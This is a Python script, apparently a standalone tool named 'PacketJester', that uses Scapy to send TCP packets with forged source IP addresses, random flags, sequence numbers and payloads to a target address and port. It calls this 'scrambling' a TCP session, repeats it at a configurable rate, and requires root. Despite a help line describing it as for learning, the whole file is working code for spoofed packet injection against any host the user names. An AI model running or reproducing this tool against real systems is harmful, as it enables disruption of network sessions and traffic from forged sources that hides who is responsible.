import argparse
import logging
import sys
import time
import random
from scapy.all import *
import threading
import socket
import netifaces

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('packetjester.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class PacketJester:
    def __init__(self, interface, target_ip, target_port=80, spoof_subnet='192.168.1.0/24', rate=1, quiet=False):
        self.interface = interface
        self.target_ip = target_ip
        self.target_port = target_port
        self.spoof_subnet = spoof_subnet
        self.rate = rate  # Packets per second
        self.quiet = quiet
        self.running = False
        self.packet_count = 0
        self.output_file = f"packetjester_results_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        conf.iface = interface
        conf.verb = 0  # Suppress Scapy output

    def get_local_ip(self):
        """Get the local IP address for the interface."""
        try:
            addrs = netifaces.ifaddresses(self.interface)
            return addrs[netifaces.AF_INET][0]['addr']
        except Exception as e:
            logging.error(f"Error getting local IP: {str(e)}")
            sys.exit(1)

    def generate_random_ip(self):
        """Generate a random IP within the spoof subnet."""
        try:
            subnet = self.spoof_subnet.split('/')[0]
            base = '.'.join(subnet.split('.')[:-1])
            last_octet = random.randint(2, 254)
            return f"{base}.{last_octet}"
        except Exception as e:
            logging.error(f"Error generating random IP: {str(e)}")
            return "192.168.1.100"

    def craft_fake_packet(self):
        """Craft a fake TCP packet with random payload and sequence numbers."""
        try:
            src_ip = self.generate_random_ip()
            payload = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=random.randint(10, 100)))
            pkt = IP(src=src_ip, dst=self.target_ip) / TCP(
                sport=random.randint(1024, 65535),
                dport=self.target_port,
                seq=random.randint(1000, 1000000),
                flags=random.choice(['S', 'A', 'P', 'F'])
            ) / payload
            return pkt
        except Exception as e:
            logging.error(f"Error crafting packet: {str(e)}")
            return None

    def scramble_session(self):
        """Inject packets to scramble a TCP session."""
        try:
            pkt = self.craft_fake_packet()
            if pkt:
                send(pkt, count=1, inter=0)
                self.packet_count += 1
                logging.info(f"Injected packet #{self.packet_count}: {pkt.summary()}")
                with open(self.output_file, 'a') as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {pkt.summary()}\n")
        except Exception as e:
            logging.error(f"Error injecting packet: {str(e)}")

    def start_injection(self):
        """Start injecting fake packets at the specified rate."""
        self.running = True
        logging.info(f"Starting PacketJester: Target={self.target_ip}:{self.target_port}, Spoof Subnet={self.spoof_subnet}, Rate={self.rate}/s")
        try:
            while self.running:
                self.scramble_session()
                time.sleep(1.0 / self.rate)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stop the injection and save results."""
        self.running = False
        logging.info(f"PacketJester stopped. Total packets injected: {self.packet_count}")
        with open(self.output_file, 'a') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Total packets injected: {self.packet_count}\n")
        logging.info(f"Results saved to {self.output_file}")

    def start(self):
        """Start the packet injection in a separate thread."""
        if not self.check_root():
            logging.error("This tool requires root privileges. Run with sudo.")
            sys.exit(1)
        injection_thread = threading.Thread(target=self.start_injection)
        injection_thread.start()
        try:
            injection_thread.join()
        except KeyboardInterrupt:
            self.stop()

    def check_root(self):
        """Check if the script is running with root privileges."""
        return os.geteuid() == 0

def main():
    parser = argparse.ArgumentParser(description="PacketJester - A tool to simulate network traffic obfuscation for learning.")
    parser.add_argument('-i', '--interface', required=True, help='Network interface (e.g., eth0)')
    parser.add_argument('-t', '--target-ip', required=True, help='Target IP address (e.g., 192.168.1.100)')
    parser.add_argument('-p', '--target-port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-s', '--spoof-subnet', default='192.168.1.0/24', help='Subnet for spoofed IPs (default: 192.168.1.0/24)')
    parser.add_argument('-r', '--rate', type=float, default=1, help='Injection rate (packets/second, default: 1)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (log to file only)')

    args = parser.parse_args()

    if args.quiet:
        logging.getLogger().handlers = [logging.FileHandler('packetjester.log')]

    jester = PacketJester(
        interface=args.interface,
        target_ip=args.target_ip,
        target_port=args.target_port,
        spoof_subnet=args.spoof_subnet,
        rate=args.rate,
        quiet=args.quiet
    )

    try:
        jester.start()
    except KeyboardInterrupt:
        jester.stop()

if __name__ == "__main__":
    main()